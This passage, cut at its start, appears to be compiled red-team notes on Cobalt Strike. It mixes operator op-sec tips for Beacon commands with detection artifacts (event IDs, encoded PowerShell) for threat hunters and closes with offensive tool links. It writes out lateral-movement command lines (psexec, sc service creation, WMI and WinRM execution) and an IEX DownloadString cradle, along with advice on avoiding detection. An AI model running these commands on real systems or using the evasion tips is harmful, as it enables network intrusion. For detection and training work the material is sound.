case is dllhost.exe. This becomes a child process of the current process.  This is used as a
sacrificial process in order to “patch” in the new logon session & credentials.

Then a new logon session is created, event ID 4672.

The account then logs on to that new session and another event is created with the ID of 4624.

In this new logon session, cmd.exe is spawned as a child process of dllhost.exe and a string is
passed into a named pipe as a unique identifier.

Now, according to the logon session attached to the parent process (dllhost.exe), ADMAlice is
the logged in user.
Finally, Conhost.exe is again called since cmd.exe is called. The unique arguments that hide the
cmd.exe window are passed into Conhost.

Now, whenever the operator attempts to login to a remote host, the new logon session
credential will be attempted first.
Run
The run command is a bit different than PTH and Shell, it does not spawn cmd.exe and instead
calls the target executable directly.

Once again though, Conhost is called with the unique arguments.

While the arguments for Conhost aren’t inherently malicious, it is a common identifier for
these commands.
execute works similarly to run, however no output is returned.
Powershell
The powershell command, as you can probably guess, runs a command through PowerShell.
Powershell.exe is spawned as a child process but the parent PID can be changed with
the ppid command. In this case, though, the ppid is kept to the original parent process.

Conhost is again called.

The major problem with the powershell command is that it always adds unique arguments to
the command and encodes the command in base64.

This results in a highly signature-able technique as it is not common to see legitimate
PowerShell scripts to run as base64 encoded with the -exec bypass flag.
Powerpick
Powerpick is a command that uses the “fork-and-run” technique, meaning Cobalt Strike
creates a sacrificial process to run the command under, returns the output, then kills the
process. The name of the spawnto process is defined in the Cobalt Strike profile on the
teamserver. In my case, it’s dllhost.exe.

When running a powerpick command, such as powerpick whoami, three processes are
created: Dllhost.exe (SpawnTo process), Conhost.exe, and whoami.exe.

While Powerpick does not spawn powershell.exe, there’s still op-sec considerations. In this
case, this behavior would look somewhat suspicious because of the parent process of
‘whoami.exe’ is ‘dllhost.exe’. Typically, when a user runs ‘whoami’ it’s going to be in the
context of cmd.exe or powershell.exe.

Figure 1: What a normal use of ‘whoami’ looks like
The op-sec consideration here is to be aware of what your parent process is and what process
you’ll be spawning. Always try to keep parent-child process relationships as ‘normal’ looking as
possible. Dllhost.exe with a child process of ‘whoami.exe’ is not normal.
Similarly, these other commands utilize the “fork-and-run” technique and you can expect
similar events:
▪
chromedump
▪
covertvpn
▪
dcsync
▪
execute-assembly
▪
hashdump
▪
logonpasswords
▪
mimikatz
▪
net *
▪
portscan
▪
pth
▪
ssh
▪
ssh-key
Spawnas
The spawnas command will create a new session as another user by supplying their credentials
and a listener.

Since this is effectively just re-deploying a payload on the host, there’s several events
associated with it.
First, a special logon session is created

If the spawnas command is run as an elevated user, the new session will have a split token,
meaning two sessions are created: One privileged and another unprivileged.

Next, a 4648 event will be created, notifying of a logon with explicitly provided credentials

Then a new process will be created under that new session, which is whatever the spawnto
process is set in the profile.

That process is now the beacon process for that logon session and user. It’s a child process of
the original beacon’s process.

There are several techniques that were not covered in this post that are considered more “op-
sec” friendly as they do not leave behind glaring obvious events behind like the ones covered
so far. Some examples of these are:
▪
Beacon Object Files (BOF)
▪
Shinject
▪
API-Only calls such as upload, mkdir, downloads, etc.
PSEXEC AND SC
sExec
PsExec comes from Microsoft’s Sysinternals suite and allows users to execute PowerShell on
remote hosts over port 445 (SMB) using named pipes. It first connects to the ADMIN$ share on
the target, over SMB, uploads PSEXESVC.exe and uses Service Control Manager to start the
.exe which creates a named pipe on the remote system, and finally uses that pipe for I/O.
An example of the syntax is the following:
psexec \\test.domain -u Domain\User -p Password ipconfig
Cobalt Strike (CS) goes about this slightly differently. It first creates a PowerShell script that will
base64 encode an embedded payload which runs from memory and is compressed into a one-
liner, connects to the ADMIN$ or C$ share & runs the PowerShell command, as shown below
https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
Cobalt Strike has two PsExec built-ins, one called PsExec and the other called PsExec (psh). The
difference between the two, and despite what CS documentation says, PsExec (psh) is calling
Powershell.exe and your beacon will be running as a Powershell.exe process, where PsExec
without the (psh) will be running as rundll32.exe.

Listing the processes in Cobalt Strike to identify our payload’s process
By default, PsExec will spawn the rundll32.exe process to run from. It’s not dropping a DLL to
disk or anything, so from a blue-team perspective, if rundll32.exe is running without
arguments, it’s VERY suspicious.
SC
Service Controller is exactly what it sounds like — it controls services. This is particularly useful
as an attacker because scheduling tasks is possible over SMB, so the syntax for starting a
remote service is:
sc \\host.domain create ExampleService binpath= “c:\windows\system32\calc.exe”
sc \\host.domain start ExampleService
The only caveat to this is that the executable must be specifically a service binary. Service
binaries are different in the sense that they must “check in” to the service control manager
(SCM) and if it doesn’t, it will exit execution. So if a non-service binary is used for this, it will
come back as an agent/beacon for a second, then die.
In CS, you can specifically craft service executables:

Generating a service EXE with Cobalt Strike
Other Beacon Commands
As part of our research, CrowdStrike Services evaluated the following Beacon commands,
which are encountered frequently in incident response engagements:
o
powershell and powershell-import
o
powerpick
o
jump psexec
o
jump psexec_psh
o
jump winrm
o
remote-exec wmi
o
remote-exec powershell
In the following sections we’ll review the purpose behind each of these commands, and the
artifacts generated that may be useful for security analysts and threat hunters.
The powershell and powershell-import Commands
Both of these commands have a similar aim: to allow the user to execute PowerShell scripts on
the target system. The powershell Beacon command executes commands written in
PowerShell within the Cobalt Strike framework. When a red teamer or an adversary executes a
command within a Beacon session, the operating system will generate an EID 400 event log
(PowerShell Engine Startup) on the system that the command is executed on. The powershell-
import Beacon command imports a PowerShell script into the Beacon session. In several
WastedLocker ransomware attacks, CrowdStrike Services[1] observed evidence of the network
discovery tool PowerView imported by adversaries shortly after establishing a Beacon on a
compromised system. The file system artifacts that are generated will vary depending on
whether the powershell command is executed before or after the powershell-
import command.
Artifacts generated before powershell-import
Figure 1 shows an example of the EID 400 event log generated by the execution of
the powershell command before a script has been imported with powershell-import. The
base64 encoded command decodes to ls, the command that was executed via
the powershell command.
Observations of powershell before powershell-import:
o
The HostApplication field is set to powershell -nop -exec -bypass -EncodedCommand
<base64-encoded-command>
o
The Base64 encoded command decodes to the <command> executed

Figure 1. Artifact generated by the powershell command before powershell-import is executed
(click image to enlarge)
An example of the observed artifact as shown in Figure 1:
HostApplication=powershell -nop -exec Bypass -EncodedCommand bABzAA==
Decoded Base64 Command: ls
Artifacts generated after powershell-import
Figure 2, shows an example of the EID 400 generated on the compromised system after
execution of the powershell command after a script was imported with powershell-import.
The base64 encoded command decodes to IEX (New-Object
Net.Webclient).DownloadString(‘http://127.0.0.1:22426/’); ls . The IEX (New-Object
Net.Webclient).DownloadString(‘http://127.0.0.1:22426/’) component of the base64 encoded
command is how Cobalt Strike manages imported PowerShell scripts within a Beacon session.
The rest of the command, after the DownloadString component, is the PowerShell command
run by the adversary.
Observations from powershell after powershell-import:
o
The HostApplication field is set to powershell -nop -exec -bypass -EncodedCommand
<base64-encoded-command>
o
The base64 encoded command decodes to IEX (New-Object
Net.Webclient).DownloadString('http://127.0.0.1:<ephemeral-port-number>/');
<command>

Figure 2. Artifact generated by the powershell command after powershell-import is executed
(click image to enlarge)
An example of the observed artifact as shown in Figure 2:
HostApplication=powershell -nop -exec Bypass -EncodedCommand
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAG
UAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOg
AvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADQAMQA5ADIALwAnACkAOwAgAGwAcwA=D
ecoded Base64 Command: IEX (New-Object
Net.Webclient).DownloadString('http://127.0.0.1:24192/'); ls
The powerpick Command
The powerpick Beacon command executes unmanaged PowerShell on a compromised system.
It provides a way to execute a PowerShell command without invoking powershell.exe. When a
red teamer or adversary executes the powerpick command through a Beacon session, the
filesystem will generate an EID 400 event log (PowerShell Engine Startup) on the compromised
system.
CrowdStrike observed that the EID 400 event log generated by executing
the powerpick command will contain a mismatch between the version number in
the HostVersion and EngineVersion event log fields. The event generated will also have the
path to the rundll32.exe executable in the HostApplication field, as it is the default program
that a Beacon will use to create a new process.
Observations of powerpick:
o
HostName field is set to ConsoleHost
o
HostApplication field is set to the file path of rundll32.exe
o
The HostVersion and EngineVersion fields are set to different values

Figure 3. Artifact generated by the powerpick Beacon command when executed (click image to
enlarge)
An example of the observed artifact as shown in Figure 3:
HostName=ConsoleHost
HostApplication=C:\windows\sysnative\rundll32.exe
HostVersion=1.0
EngineVersion=5.1.17763.1
The jump psexec Command
The jump psexec Beacon command establishes an additional Beacon on a remote system.
When an adversary executes the jump psexec command through a Beacon session, the
filesystem will generate an EID 7045 event log (Service Installation) on the remote system.
Observations of jump psexec:
o
The Service Name field is set to <7-alphanumeric-characters>
o
The Service File Name field is set to \\127.0.0.1\ADMIN$\<7-alphanumeric-
characters>.exe

Figure 4. Artifact generated by the jump psexec Beacon command when executed on the
remote system prior to version 4.1 of Cobalt Strike (click image to enlarge)
An example of the observed artifact as shown in Figure 4:
Service Name: af5ce43
Service File Name: \\127.0.0.1\ADMIN$\af5ce43.exe
By default, events generated by the jump psexec Beacon command using versions of Cobalt
Strike prior to version 4.1 will have the 127.0.0.1 localhost string in the value of the “Service
File Name,” an example of this is \\127.0.0.1\ADMIN$\7f5747a.exe. Events generated with
version 4.1+ of Cobalt Strike will contain the destination computer’s IP address in the “Service
File Name” by default and an example of this is \\10.0.0.16\ADMIN$\9a845c4.exe. In that
example 10.0.0.16 is the IP address assigned to the target system.
Observations of jump psexec after version 4.1 of Cobalt Strike:
o
The Service Name field is set to <7-alphanumeric-characters>
o
The Service File Name field is set to \\<System-IPAddress>\ADMIN$\<7-alphanumeric-
characters>.exe

Figure 5. Artifact generated by the jump psexec Beacon command when executed on the
remote system created by version 4.1+ of Cobalt Strike (click image to enlarge)
The jump psexec_psh Command
The jump psexec_psh command  establishes an additional Beacon on a remote system via the
Windows Service Control Manager. The jump_psexec command creates and starts a service
that executes a base64 encoded PowerShell Beacon stager, which generates an EID 7045 event
log (Service Installation) on the remote system.
The EID 7045 event log created by the jump psexec_psh command has a seven-character
alphanumeric value for the “Service Name” field of the created event. The “Service File Name”
field starts with the default Cobalt Strike prefix for PowerShell services %COMSPEC% /b /c start
/b /min powershell -nop -w hidden -encodedcommand.
Observations of jump psexec_psh:
o
The Service Name field is set to <7-alphanumeric-characters>
o
The Service File Name field is set to %COMSPEC% /b /c start /b /min powershell -nop -
w hidden -encodedcommand <base64-encoded-command>
o
The base64 encoded command decodes to a PowerShell stager for a Cobalt Strike
Beacon

Figure 6. Artifact generated by the jump psexec_psh Beacon command when executed on the
remote system (click image to enlarge)
An example of the observed artifact as shown in Figure 6:
Service Name: 9df3724
Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -
encodedcommand JABzA<Redacted>
The jump winrm Command
The jump winrm Beacon command establishes a Beacon on a remote system utilizing the
Windows Remote Management (WinRM) interface (native on all Windows devices). When
the jump winrm Beacon command is executed by an adversary through a Beacon session, the
filesystem will generate an EID 400 event log (PowerShell Engine Startup) on the compromised
system. The event created will contain the Cobalt Strike PowerShell command prefix in
the HostApplication field. The generated event is not affected by the usage of any of the
PowerShell-related Beacon commands.
Observations of jump winrm on the compromised system:
o
The HostApplication field is set to powershell -nop -exec -bypass -EncodedCommand
<base64-encoded-command>
o
The base64 encoded command decodes to IEX (New-Object
Net.Webclient).DownloadString(‘http://127.0.0.1:<ephemeral-port-number>/’)

Figure 7. Artifact generated by the jump winrm Beacon command when executed, on the
compromised system (click image to enlarge)
An example of the observed artifact as shown in Figure 7:
HostApplication=powershell -nop -exec bypass -EncodedCommand
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAG
UAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOg
AvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADgAMwA0ADUALwAnACkADecoded Base64
Command: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:28345/')
If a WinRM listener is not present on the remote system when the jump winrm command is
executed, Cobalt Strike will create an EID 400 event log on the remote system, as shown in
Figure 7.
Observations of an event created by jump winrm on the remote system:
o
The HostApplication field is set to <path-to-PS-executable> -Version <PS-Version> -s -
NoLogo -NoProfile

Figure 8. Artifact generated by the jump winrm Beacon command when executed on the
remote system (click image to enlarge)
 An example of the observed artifact as shown in Figure 8:
HostApplication=c:\windows\syswow64\windowspowershell\v1.0\powershell.exe -Version 5.1
-s -NoLogo -NoProfile
The remote-exec wmi Command
The remote-exec wmi Beacon command executes a command on a remote system via WMI.
When the remote-exec wmi command is executed, the filesystem will generate an EID 400
event log (PowerShell Engine Startup) on the compromised system with the standard Cobalt
Strike PowerShell command prefix in the HostApplication field.
Observations of remote-exec wmi:
o
The HostApplication field is set to powershell -nop -exec Bypass -EncodedCommand
<base64-encoded-command>
o
The base64 encoded command decodes to Invoke-WMIMethod win32_process -name
create -argumentlist '<command>' -ComputerName <target>

Figure 9. Artifact generated by the remote-exec wmi Beacon command when executed on the
compromised system (click image to enlarge)
 An example of the observed artifact as shown in Figure 9:
HostApplication=powershell -nop -exec Bypass -EncodedCommand
SQBuAHYAbwBrAGUALQBXAE0ASQBNAGUAdABoAG8AZAAgAHcAaQBuADMAMgBfAHAAcgBv
AGMAZQBzAHMAIAAtAG4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AYQByAGcAdQBtAGUAbg
B0AGwAaQBzAHQAIAAnAHcAaABvAGEAbQBpACcAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGE
AbQBlACAAVwBJAE4AMQAwAADecoded Base64 Command: Invoke-WMIMethod
win32_process -name create -argumentlist 'whoami' -ComputerName WIN10
The remote-exec powershell Command
The remote-exec powershell Beacon command executes a command on a remote system via
PowerShell remoting from a compromised system. When the remote-exec
powershell command is executed, the filesystem will generate an EID 400 event log
(PowerShell Engine Startup) on the compromised system. The event created will contain the
standard Cobalt Strike PowerShell command prefix in the HostApplication field.
Observations of remote-exec powershell:
o
The HostApplication field is set to powershell -nop -exec Bypass -EncodedCommand
<base64-encoded-command>
o
The Base64 encoded command decodes to Invoke-Command -ComputerName
<target> -ScriptBlock { <command> }

Figure 10. Artifact generated by the remote-exec powershell Beacon command when executed
on the compromised system (click image to enlarge)
An example of the observed artifact as shown in Figure 10:
HostApplication=powershell -nop -exec Bypass -EncodedCommand
SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhA
G0AZQAgADEAMAAuADAALgAwAC4AMQAwACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsA
IAB7ACAAdwBoAG8AYQBtAGkAIAB9AADecoded Base64 Command: Invoke-Command -
ComputerName 10.0.0.10 -ScriptBlock { whoami }
KIT TOOLS
https://github.com/CyberSecurityUP/Red-Team-
Management/tree/main/Adversary%20Emulation/Tools

https://github.com/CyberSecurityUP/Red-Team-
Management/tree/main/Adversary%20Emulation/Cheat%20Sheet

Extras
https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/
https://github.com/DeEpinGh0st/Erebus
https://github.com/N7WEra/SharpAllTheThings
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-
mssql
https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_payload/
https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL
%20Injection.md
https://www.tarlogic.com/blog/red-team-tales-0x01/
https://www.youtube.com/watch?v=LYo_Qa2_VPU
https://ijustwannared.team/tag/smb-relay/
https://outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-
the-most-obscure-ways/
https://github.com/CyberSecurityUP/Red-Team-
Management/blob/main/Adversary%20Emulation/Cobalt%20Strike%20-
%20Cheat%20Sheet.md
https://github.com/SecWiki/windows-kernel-exploits
